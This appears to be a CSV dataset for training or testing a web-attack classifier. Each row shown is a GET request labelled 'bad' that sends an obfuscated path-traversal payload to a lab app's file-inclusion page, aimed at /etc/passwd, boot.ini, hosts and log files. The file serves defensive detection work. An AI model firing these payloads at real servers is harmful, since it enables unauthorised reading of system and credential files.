method,path,body,sign1,sign2,sign3,sign4,sign5,sign6,badwords,class
GET,/vulnerabilities/fi/?page=ÀþÀþ%u2215ÀþÀþ%u2215ÀþÀþ%u2215ÀþÀþ%u2215etc%u2215issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®%2fø€€€®ø€€€®%2fø€€€®ø€€€®%2fboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../../../../../../var/log/httpd/access_log,,15,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.../.0x2f.../.0x2f.../.0x2f.../.0x2f.../.0x2f.../.0x2fboot.ini,,6,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,5,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\..\\..\\..\\..\\..\\..\boot.ini,,0,6,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0eà€¯%uff0e%uff0eà€¯etcà€¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%ÀnÀn0x5c%ÀnÀn0x5c%ÀnÀn0x5c%ÀnÀn0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/..\..\\..\..\\..\..\\..\boot.ini,,0,7,3,3,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%e%5%cwindows%5%csystem32%5%cdrivers%5%cetc%5%chosts,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeÀ¯%c0%ae%c0%aeÀ¯%c0%ae%c0%aeÀ¯%c0%ae%c0%aeÀ¯%c0%ae%c0%aeÀ¯windowsÀ¯system32À¯driversÀ¯etcÀ¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=0x2e0x2eÀ%qfboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../\..../\..../\..../\etc/\passwd,,4,0,0,0,0,4,2,bad
GET,/vulnerabilities/fi/?page=\..%bg%qf\..%bg%qf\..%bg%qf\..%bg%qf\..%bg%qf\..%bg%qfetc%bg%qfissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=??À%9v??À%9v??À%9v??À%9v??À%9vetcÀ%9vpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/À®À®\À®À®\À®À®\À®À®\À®À®\À®À®\,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%2%e%2%e%2%f%2%e%2%e%2%fwindows%2%fsystem32%2%fdrivers%2%fetc%2%fhosts,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=?.À\boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%uF025%uff0e%uff0e%uF025%uff0e%uff0e%uF025etc%uF025passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2eÁœ%2e%2eÁœ%2e%2eÁœ%2e%2eÁœ%2e%2eÁœetcÁœissue,,0,0,0,0,0,0,1,bad
